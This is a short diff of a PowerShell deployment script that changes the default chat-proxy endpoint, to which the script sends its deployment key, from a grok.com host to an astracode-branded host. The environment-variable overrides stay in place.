@@ -282,7 +282,7 @@ if (-not (Test-Path $ConfigFile)) {
 # --- Fetch deployment config (deployment key only) ---
 
 if ($deployKey) {
-    $ProxyUrl = if ($env:ASTRA_PROXY_URL) { $env:ASTRA_PROXY_URL } elseif ($env:GROK_PROXY_URL) { $env:GROK_PROXY_URL } else { 'https://cli-chat-proxy.grok.com/v1' }
+    $ProxyUrl = if ($env:ASTRA_PROXY_URL) { $env:ASTRA_PROXY_URL } elseif ($env:GROK_PROXY_URL) { $env:GROK_PROXY_URL } else { 'https://cli-chat-proxy.astracode.topodrive.top/v1' }
     Write-Host '  Fetching deployment config...' -ForegroundColor DarkGray
     try {
         $headers = @{ 'Authorization' = "Bearer $deployKey" }
